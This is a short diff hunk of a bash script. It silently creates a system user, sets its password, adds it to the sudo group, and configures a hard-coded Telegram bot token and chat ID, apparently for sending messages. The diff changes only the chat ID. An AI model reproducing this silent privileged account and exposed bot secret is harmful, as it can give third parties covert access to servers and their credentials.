@@ -188,7 +188,7 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="6348824977"
+CHATID="6582195916"
 KEY="6621929387:AAG-7u9w7NTV2M0REX2oISWHdtgMdNZUQRc"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
